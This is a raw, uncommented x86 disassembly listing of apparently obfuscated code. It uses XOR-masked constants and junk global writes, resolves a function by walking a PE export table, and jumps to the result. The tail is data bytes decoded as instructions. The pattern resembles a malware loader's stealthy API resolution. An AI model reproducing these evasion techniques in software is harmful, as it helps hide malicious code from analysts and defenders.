  42173c:	mov    eax,DWORD PTR [ebp-0x15c]
  421742:	mov    edx,DWORD PTR [ebp-0x158]
  421748:	xor    eax,0xca79a575
  42174d:	xor    edx,0x9c1b89e8
  421753:	mov    cl,0x3e
  421755:	call   0x422235
  42175a:	or     esi,eax
  42175c:	or     edi,edx
  42175e:	mov    DWORD PTR [ebp-0x178],esi
  421764:	mov    ecx,DWORD PTR [ebp-0xd8]
  42176a:	mov    eax,0x459a
  42176f:	xor    edx,edx
  421771:	div    ecx
  421773:	mov    ecx,DWORD PTR [ebp-0xdc]
  421779:	and    eax,ecx
  42177b:	add    eax,DWORD PTR [ebp-0x44]
  42177e:	mov    ecx,DWORD PTR [ebp-0xe0]
  421784:	lea    eax,[eax+ecx*1+0x272f]
  42178b:	xor    eax,0x1080c
  421790:	add    eax,DWORD PTR [ebp-0x178]
  421796:	mov    DWORD PTR [ebp-0xe8],eax
  42179c:	mov    DWORD PTR [ebp-0xc],0x5950
  4217a3:	mov    DWORD PTR [ebp-0xf8],0x4964
  4217ad:	mov    DWORD PTR [ebp-0x130],0x3
  4217b7:	mov    DWORD PTR [ebp-0x20],0x2df9
  4217be:	mov    DWORD PTR [ebp-0x8],0x4524
  4217c5:	mov    DWORD PTR [ebp-0xd4],0x637e
  4217cf:	mov    DWORD PTR [ebp-0x110],0x38c8
  4217d9:	mov    DWORD PTR [ebp-0xa4],0x7118
  4217e3:	mov    DWORD PTR [ebp-0xa0],0xaf6
  4217ed:	mov    DWORD PTR [ebp-0x10c],0x3315
  4217f7:	mov    eax,DWORD PTR [ebp-0xf8]
  4217fd:	mov    ecx,DWORD PTR [ebp-0x130]
  421803:	xor    edx,edx
  421805:	div    ecx
  421807:	add    eax,0x454e
  42180c:	mov    ecx,DWORD PTR [ebp-0xc]
  42180f:	and    eax,ecx
  421811:	xor    eax,0x5940
  421816:	add    eax,DWORD PTR [ebp+0x8]
  421819:	mov    ecx,DWORD PTR [ebp-0x110]
  42181f:	mov    edx,DWORD PTR [ebp-0xa4]
  421825:	sub    ecx,edx
  421827:	mov    edx,DWORD PTR [ebp-0xd4]
  42182d:	or     ecx,edx
  42182f:	mov    edx,DWORD PTR [ebp-0x8]
  421832:	and    ecx,edx
  421834:	mov    edx,DWORD PTR [ebp-0x20]
  421837:	xor    ecx,edx
  421839:	mov    edx,DWORD PTR [ebp-0x10c]
  42183f:	mov    esi,0x180f
  421844:	sub    esi,edx
  421846:	mov    edx,DWORD PTR [ebp-0xa0]
  42184c:	imul   esi,edx
  42184f:	xor    esi,0x402b
  421855:	xor    esi,0xfed78c17
  42185b:	mov    edx,DWORD PTR [ebp-0xe8]
  421861:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  421868:	add    ecx,eax
  42186a:	add    esi,ecx
  42186c:	mov    DWORD PTR [ebp-0x38],esi
  42186f:	mov    DWORD PTR [ebp-0x4],0x59a8
  421876:	mov    DWORD PTR [ebp-0x30],0x7021
  42187d:	mov    DWORD PTR [ebp-0xf4],0x6210
  421887:	mov    DWORD PTR [ebp-0x58],0x73d5
  42188e:	mov    DWORD PTR [ebp-0x124],0x1e7d
  421898:	mov    DWORD PTR [ebp-0x3c],0x3144
  42189f:	mov    eax,DWORD PTR [ebp-0x30]
  4218a2:	xor    eax,0x75cb
  4218a7:	mov    ecx,DWORD PTR [ebp-0x4]
  4218aa:	imul   eax,ecx
  4218ad:	mov    ecx,DWORD PTR [ebp+0x8]
  4218b0:	lea    ecx,[ecx+eax*1-0x2123b90]
  4218b7:	mov    eax,DWORD PTR [ebp-0xf4]
  4218bd:	and    eax,0x6b34
  4218c2:	and    eax,0x658d
  4218c7:	xor    edx,edx
  4218c9:	push   0x6
  4218cb:	pop    esi
  4218cc:	div    esi
  4218ce:	imul   eax,eax,0x3fb9
  4218d4:	mov    edx,DWORD PTR [ebp-0x3c]
  4218d7:	and    edx,0x58c7
  4218dd:	mov    esi,DWORD PTR [ebp-0x124]
  4218e3:	or     edx,esi
  4218e5:	add    edx,0x7a25
  4218eb:	imul   edx,edx,0x28d2
  4218f1:	mov    esi,DWORD PTR [ebp-0x58]
  4218f4:	xor    edx,esi
  4218f6:	xor    edx,0x1856f731
  4218fc:	mov    esi,DWORD PTR [ebp-0xe8]
  421902:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  421909:	add    eax,ecx
  42190b:	add    edx,eax
  42190d:	mov    DWORD PTR [ebp-0xac],edx
  421913:	mov    DWORD PTR [ebp-0x54],0x1
  42191a:	mov    DWORD PTR [ebp-0x40],0x1ee8
  421921:	mov    DWORD PTR [ebp-0x1c],0x64d8
  421928:	mov    DWORD PTR [ebp-0xf0],0x5a06
  421932:	mov    DWORD PTR [ebp-0x108],0x2eeb
  42193c:	mov    DWORD PTR [ebp-0x104],0x2108
  421946:	mov    eax,DWORD PTR [ebp-0x1c]
  421949:	xor    edx,edx
  42194b:	push   0x3
  42194d:	pop    ecx
  42194e:	div    ecx
  421950:	mov    ecx,DWORD PTR [ebp-0x40]
  421953:	or     eax,ecx
  421955:	mov    ecx,DWORD PTR [ebp-0x54]
  421958:	xor    edx,edx
  42195a:	div    ecx
  42195c:	imul   eax,eax,0x7d53
  421962:	mov    ecx,DWORD PTR [ebp+0x8]
  421965:	lea    eax,[ecx+eax*1-0x1f534807]
  42196c:	mov    ecx,DWORD PTR [ebp-0xf0]
  421972:	and    ecx,0x4108
  421978:	and    ecx,0x40e7
  42197e:	sub    ecx,0x1a54
  421984:	xor    ecx,0x25ac
  42198a:	mov    edx,DWORD PTR [ebp-0x104]
  421990:	xor    edx,0x6dda
  421996:	mov    esi,DWORD PTR [ebp-0x108]
  42199c:	and    edx,esi
  42199e:	and    edx,0xe0c
  4219a4:	or     edx,0x5b
  4219a7:	mov    esi,DWORD PTR [ebp-0xe8]
  4219ad:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  4219b1:	add    ecx,eax
  4219b3:	lea    eax,[edx+ecx*1-0xc5b]
  4219ba:	mov    DWORD PTR [ebp-0xa8],eax
  4219c0:	and    DWORD PTR [ebp-0x144],0x0
  4219c7:	jmp    0x4219d9
  4219cc:	mov    eax,DWORD PTR [ebp-0x144]
  4219d2:	inc    eax
  4219d3:	mov    DWORD PTR [ebp-0x144],eax
  4219d9:	mov    eax,DWORD PTR [ebp-0xe8]
  4219df:	mov    ecx,DWORD PTR [ebp-0x144]
  4219e5:	cmp    ecx,DWORD PTR [eax+0x18]
  4219e8:	je     0x421fa1
  4219ee:	mov    eax,DWORD PTR [ebp-0x144]
  4219f4:	mov    ecx,DWORD PTR [ebp-0x38]
  4219f7:	mov    edx,DWORD PTR [ebp+0x8]
  4219fa:	add    edx,DWORD PTR [ecx+eax*4]
  4219fd:	mov    DWORD PTR [ebp-0x48],edx
  421a00:	mov    eax,DWORD PTR [ebp-0x48]
  421a03:	mov    DWORD PTR [ebp-0x210],eax
  421a09:	mov    eax,DWORD PTR [ebp+0xc]
  421a0c:	mov    DWORD PTR [ebp-0x20c],eax
  421a12:	mov    DWORD PTR [ebp-0x1f0],0xca79a575
  421a1c:	mov    DWORD PTR [ebp-0x1ec],0x9c1b89e8
  421a26:	mov    DWORD PTR [ebp-0x1e0],0xca79a571
  421a30:	mov    DWORD PTR [ebp-0x1dc],0x9c1b89e8
  421a3a:	lea    eax,[ebp-0x1e8]
  421a40:	mov    DWORD PTR [ebp-0x1f4],eax
  421a46:	mov    eax,DWORD PTR [ebp-0x20c]
  421a4c:	movzx  eax,WORD PTR [eax+0x20]
  421a50:	xor    eax,0xa49b
  421a55:	movzx  eax,ax
  421a58:	sar    eax,1
  421a5a:	mov    ecx,DWORD PTR [ebp-0x20c]
  421a60:	movzx  ecx,WORD PTR [ecx+0x20]
  421a64:	xor    ecx,0xa49b
  421a6a:	movzx  ecx,cx
  421a6d:	shl    ecx,0xf
  421a70:	or     eax,ecx
  421a72:	movzx  eax,ax
  421a75:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421a7b:	mov    DWORD PTR [ecx],eax
  421a7d:	mov    eax,DWORD PTR [ebp-0x1e0]
  421a83:	mov    edx,DWORD PTR [ebp-0x1dc]
  421a89:	xor    eax,0xca79a575
  421a8e:	xor    edx,0x9c1b89e8
  421a94:	mov    cl,0x2
  421a96:	call   0x40a9b5
  421a9b:	mov    ebx,eax
  421a9d:	mov    esi,edx
  421a9f:	mov    eax,DWORD PTR [ebp-0x1e0]
  421aa5:	mov    edx,DWORD PTR [ebp-0x1dc]
  421aab:	xor    eax,0xca79a575
  421ab0:	xor    edx,0x9c1b89e8
  421ab6:	mov    cl,0x3e
  421ab8:	call   0x422235
  421abd:	or     ebx,eax
  421abf:	or     esi,edx
  421ac1:	movzx  eax,bl
  421ac4:	push   eax
  421ac5:	lea    eax,[ebp-0x198]
  421acb:	push   eax
  421acc:	call   0x416c9e
  421ad1:	mov    eax,DWORD PTR [ebp-0x1f0]
  421ad7:	mov    edx,DWORD PTR [ebp-0x1ec]
  421add:	xor    eax,0xca79a575
  421ae2:	xor    edx,0x9c1b89e8
  421ae8:	mov    cl,0x2
  421aea:	call   0x40a9b5
  421aef:	mov    esi,eax
  421af1:	mov    edi,edx
  421af3:	mov    eax,DWORD PTR [ebp-0x1f0]
  421af9:	mov    edx,DWORD PTR [ebp-0x1ec]
  421aff:	xor    eax,0xca79a575
  421b04:	xor    edx,0x9c1b89e8
  421b0a:	mov    cl,0x3e
  421b0c:	call   0x422235
  421b11:	or     esi,eax
  421b13:	or     edi,edx
  421b15:	mov    DWORD PTR [ebp-0x1f8],esi
  421b1b:	jmp    0x421b70
  421b20:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b26:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b2c:	xor    eax,0xca79a575
  421b31:	xor    edx,0x9c1b89e8
  421b37:	mov    cl,0x2
  421b39:	call   0x40a9b5
  421b3e:	mov    esi,eax
  421b40:	mov    edi,edx
  421b42:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b48:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b4e:	xor    eax,0xca79a575
  421b53:	xor    edx,0x9c1b89e8
  421b59:	mov    cl,0x3e
  421b5b:	call   0x422235
  421b60:	or     esi,eax
  421b62:	or     edi,edx
  421b64:	add    esi,DWORD PTR [ebp-0x1f8]
  421b6a:	mov    DWORD PTR [ebp-0x1f8],esi
  421b70:	mov    eax,DWORD PTR [ebp-0x1e8]
  421b76:	cmp    DWORD PTR [ebp-0x1f8],eax
  421b7c:	je     0x421c0f
  421b82:	mov    eax,DWORD PTR [ebp-0x1f8]
  421b88:	mov    ecx,DWORD PTR [ebp-0x20c]
  421b8e:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421b93:	xor    eax,0xa49b
  421b98:	movzx  eax,ax
  421b9b:	sar    eax,1
  421b9d:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421ba3:	mov    edx,DWORD PTR [ebp-0x20c]
  421ba9:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421bae:	xor    ecx,0xa49b
  421bb4:	movzx  ecx,cx
  421bb7:	shl    ecx,0xf
  421bba:	or     eax,ecx
  421bbc:	movzx  eax,ax
  421bbf:	mov    DWORD PTR [ebp-0x1fc],eax
  421bc5:	mov    eax,DWORD PTR [ebp-0x1f8]
  421bcb:	mov    ecx,DWORD PTR [ebp-0x20c]
  421bd1:	movzx  eax,WORD PTR [ecx+eax*4]
  421bd5:	xor    eax,0xa49b
  421bda:	movzx  eax,ax
  421bdd:	sar    eax,1
  421bdf:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421be5:	mov    edx,DWORD PTR [ebp-0x20c]
  421beb:	movzx  ecx,WORD PTR [edx+ecx*4]
  421bef:	xor    ecx,0xa49b
  421bf5:	movzx  ecx,cx
  421bf8:	shl    ecx,0xf
  421bfb:	or     eax,ecx
  421bfd:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421c03:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421c0a:	jmp    0x421b20
  421c0f:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c15:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c1b:	xor    eax,0xca79a575
  421c20:	xor    edx,0x9c1b89e8
  421c26:	mov    cl,0x2
  421c28:	call   0x40a9b5
  421c2d:	mov    esi,eax
  421c2f:	mov    edi,edx
  421c31:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c37:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c3d:	xor    eax,0xca79a575
  421c42:	xor    edx,0x9c1b89e8
  421c48:	mov    cl,0x3e
  421c4a:	call   0x422235
  421c4f:	or     esi,eax
  421c51:	or     edi,edx
  421c53:	mov    DWORD PTR [ebp-0x1e4],esi
  421c59:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c5f:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c65:	xor    eax,0xca79a575
  421c6a:	xor    edx,0x9c1b89e8
  421c70:	mov    cl,0x2
  421c72:	call   0x40a9b5
  421c77:	mov    esi,eax
  421c79:	mov    edi,edx
  421c7b:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c81:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c87:	xor    eax,0xca79a575
  421c8c:	xor    edx,0x9c1b89e8
  421c92:	mov    cl,0x3e
  421c94:	call   0x422235
  421c99:	or     esi,eax
  421c9b:	or     edi,edx
  421c9d:	mov    DWORD PTR [ebp-0x23c],esi
  421ca3:	mov    DWORD PTR [ebp-0x238],edi
  421ca9:	mov    eax,DWORD PTR [ebp-0x23c]
  421caf:	or     eax,DWORD PTR [ebp-0x238]
  421cb5:	je     0x421f15
  421cbb:	lea    eax,[ebp-0x204]
  421cc1:	mov    DWORD PTR [ebp-0x208],eax
  421cc7:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ccd:	xor    edx,edx
  421ccf:	mov    cl,0x2
  421cd1:	call   0x422235
  421cd6:	mov    esi,eax
  421cd8:	mov    edi,edx
  421cda:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ce0:	xor    edx,edx
  421ce2:	mov    cl,0x3e
  421ce4:	call   0x40a9b5
  421ce9:	or     esi,eax
  421ceb:	or     edi,edx
  421ced:	xor    esi,0xca79a575
  421cf3:	xor    edi,0x9c1b89e8
  421cf9:	mov    eax,DWORD PTR [ebp-0x208]
  421cff:	mov    DWORD PTR [eax],esi
  421d01:	mov    DWORD PTR [eax+0x4],edi
  421d04:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d0a:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d12:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d18:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d1e:	xor    eax,0xca79a575
  421d23:	xor    edx,0x9c1b89e8
  421d29:	mov    cl,0x2
  421d2b:	call   0x40a9b5
  421d30:	mov    ebx,eax
  421d32:	mov    edi,edx
  421d34:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d3a:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d40:	xor    eax,0xca79a575
  421d45:	xor    edx,0x9c1b89e8
  421d4b:	mov    cl,0x3e
  421d4d:	call   0x422235
  421d52:	or     ebx,eax
  421d54:	or     edi,edx
  421d56:	movsx  eax,bl
  421d59:	cmp    esi,eax
  421d5b:	je     0x421ebb
  421d61:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d67:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d6f:	mov    eax,DWORD PTR [ebp-0x204]
  421d75:	mov    edx,DWORD PTR [ebp-0x200]
  421d7b:	xor    eax,0xca79a575
  421d80:	xor    edx,0x9c1b89e8
  421d86:	mov    cl,0x2
  421d88:	call   0x40a9b5
  421d8d:	mov    edi,eax
  421d8f:	mov    ebx,edx
  421d91:	mov    eax,DWORD PTR [ebp-0x204]
  421d97:	mov    edx,DWORD PTR [ebp-0x200]
  421d9d:	xor    eax,0xca79a575
  421da2:	xor    edx,0x9c1b89e8
  421da8:	mov    cl,0x3e
  421daa:	call   0x422235
  421daf:	or     edi,eax
  421db1:	or     ebx,edx
  421db3:	mov    eax,DWORD PTR [ebp-0x210]
  421db9:	movsx  eax,BYTE PTR [eax+edi*1]
  421dbd:	cmp    esi,eax
  421dbf:	je     0x421dcf
  421dc5:	jmp    0x421f15
  421dca:	jmp    0x421ebb
  421dcf:	mov    eax,DWORD PTR [ebp-0x204]
  421dd5:	mov    edx,DWORD PTR [ebp-0x200]
  421ddb:	xor    eax,0xca79a575
  421de0:	xor    edx,0x9c1b89e8
  421de6:	mov    cl,0x2
  421de8:	call   0x40a9b5
  421ded:	mov    esi,eax
  421def:	mov    edi,edx
  421df1:	mov    eax,DWORD PTR [ebp-0x204]
  421df7:	mov    edx,DWORD PTR [ebp-0x200]
  421dfd:	xor    eax,0xca79a575
  421e02:	xor    edx,0x9c1b89e8
  421e08:	mov    cl,0x3e
  421e0a:	call   0x422235
  421e0f:	or     esi,eax
  421e11:	or     edi,edx
  421e13:	mov    eax,DWORD PTR [ebp-0x210]
  421e19:	movsx  esi,BYTE PTR [eax+esi*1]
  421e1d:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e23:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e29:	xor    eax,0xca79a575
  421e2e:	xor    edx,0x9c1b89e8
  421e34:	mov    cl,0x2
  421e36:	call   0x40a9b5
  421e3b:	mov    ebx,eax
  421e3d:	mov    edi,edx
  421e3f:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e45:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e4b:	xor    eax,0xca79a575
  421e50:	xor    edx,0x9c1b89e8
  421e56:	mov    cl,0x3e
  421e58:	call   0x422235
  421e5d:	or     ebx,eax
  421e5f:	or     edi,edx
  421e61:	movsx  eax,bl
  421e64:	cmp    esi,eax
  421e66:	jne    0x421ebb
  421e6c:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e72:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e78:	xor    eax,0xca79a575
  421e7d:	xor    edx,0x9c1b89e8
  421e83:	mov    cl,0x2
  421e85:	call   0x40a9b5
  421e8a:	mov    esi,eax
  421e8c:	mov    edi,edx
  421e8e:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e94:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e9a:	xor    eax,0xca79a575
  421e9f:	xor    edx,0x9c1b89e8
  421ea5:	mov    cl,0x3e
  421ea7:	call   0x422235
  421eac:	or     esi,eax
  421eae:	or     edi,edx
  421eb0:	mov    DWORD PTR [ebp-0x214],esi
  421eb6:	jmp    0x421f5f
  421ebb:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ec1:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ec7:	xor    eax,0xca79a575
  421ecc:	xor    edx,0x9c1b89e8
  421ed2:	mov    cl,0x2
  421ed4:	call   0x40a9b5
  421ed9:	mov    esi,eax
  421edb:	mov    edi,edx
  421edd:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ee3:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ee9:	xor    eax,0xca79a575
  421eee:	xor    edx,0x9c1b89e8
  421ef4:	mov    cl,0x3e
  421ef6:	call   0x422235
  421efb:	or     esi,eax
  421efd:	or     edi,edx
  421eff:	add    esi,DWORD PTR [ebp-0x1e4]
  421f05:	mov    DWORD PTR [ebp-0x1e4],esi
  421f0b:	jmp    0x421c59
  421f10:	jmp    0x421c59
  421f15:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f1b:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f21:	xor    eax,0xca79a575
  421f26:	xor    edx,0x9c1b89e8
  421f2c:	mov    cl,0x2
  421f2e:	call   0x40a9b5
  421f33:	mov    esi,eax
  421f35:	mov    edi,edx
  421f37:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f3d:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f43:	xor    eax,0xca79a575
  421f48:	xor    edx,0x9c1b89e8
  421f4e:	mov    cl,0x3e
  421f50:	call   0x422235
  421f55:	or     esi,eax
  421f57:	or     edi,edx
  421f59:	mov    DWORD PTR [ebp-0x214],esi
  421f5f:	mov    eax,DWORD PTR [ebp-0x214]
  421f65:	mov    DWORD PTR [ebp-0xc8],eax
  421f6b:	cmp    DWORD PTR [ebp-0xc8],0x0
  421f72:	je     0x421f9c
  421f78:	mov    eax,DWORD PTR [ebp-0x144]
  421f7e:	mov    ecx,DWORD PTR [ebp-0xac]
  421f84:	movzx  eax,WORD PTR [ecx+eax*2]
  421f88:	mov    ecx,DWORD PTR [ebp-0xa8]
  421f8e:	mov    eax,DWORD PTR [ecx+eax*4]
  421f91:	mov    DWORD PTR [ebp-0xfc],eax
  421f97:	jmp    0x421fa1
  421f9c:	jmp    0x4219cc
  421fa1:	cmp    DWORD PTR [ebp-0xfc],0x0
  421fa8:	jne    0x421fb5
  421fae:	xor    eax,eax
  421fb0:	jmp    0x42222e
  421fb5:	mov    eax,DWORD PTR [ebp+0x8]
  421fb8:	add    eax,DWORD PTR [ebp-0xfc]
  421fbe:	mov    DWORD PTR [ebp-0xec],eax
  421fc4:	mov    DWORD PTR [ebp-0x74],0x0
  421fcb:	cmp    DWORD PTR [ebp-0xb0],0x0
  421fd2:	je     0x42204e
  421fd8:	cmp    DWORD PTR [ebp-0xb0],0x0
  421fdf:	je     0x42204e
  421fe5:	mov    eax,DWORD PTR [ebp-0xb0]
  421feb:	shl    eax,0x2
  421fee:	mov    DWORD PTR [ebp-0x74],eax
  421ff1:	mov    DWORD PTR [ebp-0x14c],0x0
  421ffb:	sub    esp,DWORD PTR [ebp-0x74]
  421ffe:	mov    DWORD PTR [ebp-0x14c],esp
  422004:	mov    DWORD PTR [ebp-0x148],0x0
  42200e:	mov    eax,DWORD PTR [ebp-0x148]
  422014:	cmp    eax,DWORD PTR [ebp-0xb0]
  42201a:	je     0x42204e
  422020:	mov    eax,DWORD PTR [ebp-0x148]
  422026:	mov    ecx,DWORD PTR [ebp-0x14c]
  42202c:	mov    edx,DWORD PTR [ebp-0x148]
  422032:	mov    esi,DWORD PTR [ebp+0x14]
  422035:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  422039:	mov    DWORD PTR [ecx+eax*4],edx
  42203c:	mov    eax,DWORD PTR [ebp-0x148]
  422042:	inc    eax
  422043:	mov    DWORD PTR [ebp-0x148],eax
  422049:	jmp    0x42200e
  42204e:	mov    DWORD PTR [ebp-0x9c],0x0
  422058:	push   0x4221e7
  42205d:	jmp    DWORD PTR [ebp-0xec]
  422063:	mov    eax,eax
  422065:	mov    ecx,esp
  422067:	ret    0xc
  42206a:	cmp    DWORD PTR ds:0x4282ff,0x0
  422071:	mov    DWORD PTR ds:0x4282fb,0x7476
  42207b:	mov    DWORD PTR ds:0x428177,0x1cdc
  422085:	mov    DWORD PTR ds:0x4282fb,0x65fa
  42208f:	mov    DWORD PTR ds:0x428167,0x5dca
  422099:	jmp    0x4220e3
  42209e:	mov    eax,ds:0x4282f7
  4220a3:	cmp    DWORD PTR ds:0x4282ff,0x0
  4220aa:	jbe    0x4220cb
  4220b0:	push   0x24f1
  4220b5:	call   DWORD PTR ds:0x428d78
  4220bb:	inc    DWORD PTR ds:0x4283a3
  4220c1:	sub    DWORD PTR ds:0x428183,0x46d9
  4220cb:	inc    DWORD PTR ds:0x4282ff
  4220d1:	adc    DWORD PTR ds:0x42830b,ebx
  4220d7:	or     DWORD PTR ds:0x428233,0x4029
  4220e1:	not    eax
  4220e3:	push   ebx
  4220e4:	push   esi
  4220e5:	sbb    DWORD PTR ds:0x42838f,edx
  4220eb:	mov    eax,DWORD PTR [esp+0x18]
  4220ef:	or     eax,eax
  4220f1:	jne    0x422121
  4220f7:	mov    ecx,DWORD PTR [esp+0x14]
  4220fb:	mov    eax,DWORD PTR [esp+0x10]
  4220ff:	xor    edx,edx
  422101:	div    ecx
  422103:	xor    DWORD PTR ds:0x42818f,0x45f1
  42210d:	mov    ebx,eax
  42210f:	mov    eax,DWORD PTR [esp+0xc]
  422113:	div    ecx
  422115:	mov    edx,0x36e3
  42211a:	mov    edx,ebx
  42211c:	jmp    0x4221e2
  422121:	mov    ecx,eax
  422123:	sbb    eax,0x67a9
  422128:	mov    ebx,DWORD PTR [esp+0x14]
  42212c:	cmp    DWORD PTR ds:0x4282f7,0x0
  422133:	mov    edx,DWORD PTR ds:0x4283a7
  422139:	mov    DWORD PTR ds:0x428327,0x4bc7
  422143:	mov    edx,DWORD PTR ds:0x42830f
  422149:	jmp    0x422193
  42214e:	mov    DWORD PTR ds:0x428257,0x15f
  422158:	mov    DWORD PTR ds:0x42828f,0x4dd1
  422162:	cmp    DWORD PTR ds:0x4282f7,0x0
  422169:	jle    0x422186
  42216f:	push   0x824e
  422174:	call   DWORD PTR ds:0x428d7c
  42217a:	xor    DWORD PTR ds:0x42830f,0x6c44
  422184:	sub    edx,edx
  422186:	sbb    DWORD PTR ds:0x428257,0x445e
  422190:	dec    edx
  422191:	not    edx
  422193:	mov    edx,DWORD PTR [esp+0x10]
  422197:	mov    eax,DWORD PTR [esp+0xc]
  42219b:	shr    ecx,1
  42219d:	rcr    ebx,1
  42219f:	shr    edx,1
  4221a1:	rcr    eax,1
  4221a3:	or     ecx,ecx
  4221a5:	jne    0x42219b
  4221ab:	div    ebx
  4221ad:	mov    esi,eax
  4221af:	mul    DWORD PTR [esp+0x18]
  4221b3:	mov    ecx,eax
  4221b5:	mov    eax,DWORD PTR [esp+0x14]
  4221b9:	mul    esi
  4221bb:	add    edx,ecx
  4221bd:	jb     0x4221dd
  4221c3:	cmp    edx,DWORD PTR [esp+0x10]
  4221c7:	ja     0x4221dd
  4221cd:	jb     0x4221de
  4221d3:	cmp    eax,DWORD PTR [esp+0xc]
  4221d7:	jbe    0x4221de
  4221dd:	dec    esi
  4221de:	xor    edx,edx
  4221e0:	mov    eax,esi
  4221e2:	pop    esi
  4221e3:	pop    ebx
  4221e4:	ret    0x10
  4221e7:	or     DWORD PTR ds:0x428373,0x42837f
  4221f1:	sub    DWORD PTR [ebp+0x10],0x1
  4221f5:	mov    DWORD PTR ds:0x42817b,0x43bf
  4221ff:	cmp    DWORD PTR [ebp+0x10],0x0
  422203:	mov    DWORD PTR ds:0x42836b,0x612a
  42220d:	je     0x42221c
  422213:	xor    DWORD PTR ds:0x428167,edx
  422219:	add    esp,DWORD PTR [ebp-0x74]
  42221c:	mov    DWORD PTR [ebp-0x9c],eax
  422222:	mov    DWORD PTR ds:0x42826f,ebx
  422228:	mov    eax,DWORD PTR [ebp-0x9c]
  42222e:	pop    edi
  42222f:	pop    esi
  422230:	pop    ebx
  422231:	leave  
  422232:	ret    0x10
  422235:	cmp    cl,0x40
  422238:	mov    DWORD PTR ds:0x428253,0x43a8
  422242:	jae    0x422294
  422248:	mov    DWORD PTR ds:0x428187,0x42f2
  422252:	cmp    cl,0x20
  422255:	mov    DWORD PTR ds:0x42816f,0x3d58
  42225f:	jae    0x42227f
  422265:	or     DWORD PTR ds:0x428163,0x5e1e
  42226f:	shld   edx,eax,cl
  422272:	mov    DWORD PTR ds:0x428287,0x1bd2
  42227c:	shl    eax,cl
  42227e:	ret    
  42227f:	inc    edx
  422280:	mov    edx,eax
  422282:	sub    DWORD PTR ds:0x4283a3,0x4282fb
  42228c:	xor    eax,eax
  42228e:	and    cl,0x1f
  422291:	shl    edx,cl
  422293:	ret    
  422294:	xor    eax,eax
  422296:	xor    edx,edx
  422298:	ret    
  422299:	add    BYTE PTR [eax],al
  42229b:	add    BYTE PTR [eax],al
  42229d:	add    BYTE PTR [eax],al
  42229f:	add    cl,ch
  4222a1:	cmp    ebp,DWORD PTR [ebx+0x14]
  4222a4:	cmp    al,0x26
  4222a6:	sub    al,0x44
  4222a8:	jno    0x422313
  4222aa:	ja     0x422311
  4222ac:	int3   
  4222ad:	fsubr  QWORD PTR [edx+0x1e]
  4222b0:	jo     0x422317
  4222b2:	popa   
  4222b3:	ins    BYTE PTR es:[edi],dx
  4222b4:	push   eax
  4222b5:	lods   eax,DWORD PTR ds:[esi]
  4222b6:	xor    DWORD PTR [esi+0x41],edi
  4222b9:	ins    BYTE PTR es:[edi],dx
  4222ba:	popa   
  4222bb:	outs   dx,BYTE PTR ds:[esi]
  4222bc:	add    BYTE PTR [eax],al
  4222be:	add    BYTE PTR [eax],al
  4222c0:	addr16 jb 0x422328
  4222c3:	popa   
  4222c4:	je     0x42232d
  4222c6:	jb     0x42232d
  4222c8:	popa   
  4222c9:	je     0x422332
  4222cb:	jb     0x422332
  4222cd:	popa   
  4222ce:	je     0x422337
  4222d0:	jb     0x422337
  4222d2:	popa   
  4222d3:	je     0x42233c
  4222d5:	jb     0x42233c
  4222d7:	popa   
  4222d8:	je     0x422341
  4222da:	jb     0x422341
  4222dc:	popa   
  4222dd:	je     0x422346
  4222df:	jb     0x422346
  4222e1:	popa   
  4222e2:	je     0x42234b
  4222e4:	jb     0x42234b
  4222e6:	popa   
  4222e7:	je     0x422350
  4222e9:	jb     0x422350
  4222eb:	popa   
  4222ec:	je     0x422355
  4222ee:	jb     0x422355
  4222f0:	popa   
  4222f1:	je     0x4222f3
  4222f3:	add    BYTE PTR [eax+0x65],ch
  4222f6:	ins    BYTE PTR es:[edi],dx
  4222f7:	ins    BYTE PTR es:[edi],dx
  4222f8:	push   0x686c6c65
  4222fd:	gs ins BYTE PTR es:[edi],dx
  4222ff:	ins    BYTE PTR es:[edi],dx
  422300:	push   0x686c6c65
  422305:	gs ins BYTE PTR es:[edi],dx
  422307:	ins    BYTE PTR es:[edi],dx
  422308:	push   0x686c6c65
  42230d:	gs ins BYTE PTR es:[edi],dx
